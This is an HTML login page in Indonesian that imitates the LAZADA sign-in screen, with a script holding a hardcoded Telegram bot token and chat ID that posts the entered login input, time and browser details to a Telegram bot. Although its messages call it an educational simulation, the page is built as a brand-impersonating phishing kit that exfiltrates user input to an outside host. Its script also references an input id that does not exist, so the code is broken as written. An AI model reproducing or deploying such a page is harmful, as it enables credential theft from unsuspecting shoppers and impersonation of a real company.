<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background: #ffffff;
            color: #222;
        }

        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 24px 20px 40px;
        }

        .back {
            font-size: 22px;
            margin-bottom: 10px;
            cursor: pointer;
        }

        h1 {
            font-size: 24px;
            margin: 10px 0 20px;
            font-weight: 700;
        }

        .mascot {
            text-align: center;
            margin: 20px 0 30px;
        }

        .mascot img {
            width: 120px;
            height: auto;
        }

        .input-group {
            margin-bottom: 14px;
        }

        input {
            width: 100%;
            padding: 14px 12px;
            font-size: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            outline: none;
        }

        input:focus {
            border-color: #ff0066;
        }

        .btn-login {
            width: 100%;
            margin-top: 10px;
            padding: 14px;
            background: #ff0066;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-login:active {
            opacity: 0.9;
        }

        .link {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
        }

        .link a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .link a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="back">‚Üê</div>

    <h1>Halo üëã<br>Selamat datang di LAZADA</h1>

    <div class="mascot">
        <!-- Ganti src dengan gambar maskot jika ada -->
        <img src="https://www.line-stickers.com/wp-content/uploads/2020/04/Laz-The-Happy-Lion-.png" alt="Maskot">
    </div>

    <div class="input-group">
        <input type="text" placeholder="Masukkan nomor telepon atau email kamu">
    </div>

    <div class="input-group">
        <input type="password" placeholder="Silakan masukkan kata sandi">
    </div>

    <button class="btn-login" onclick="kirim()">LOGIN</button>

    <div class="link">
        <a href="#">Lupa Kata Sandi?</a>
    </div>

    <div class="footer">
        Belum daftar? <a href="#">Daftar</a>
    </div>
</div>

<script>
const BOT_TOKEN = "8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M";
const CHAT_ID  = "5116335881";

function kirim() {
  const user = document.getElementById("user").value;
  if (!user) {
    alert("Isi data simulasi");
    return;
  }

  const pesan =
`üîê SIMULASI EDUKASI LOGIN
üë§ Input: ${user}
üïí ${new Date().toLocaleString()}
üåê ${navigator.userAgent}
üìò Tanpa password`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: pesan
    })
  });

  alert("Simulasi selesai.\nIni contoh bagaimana data bisa terkirim.");
}
</script>

</body>
</html>
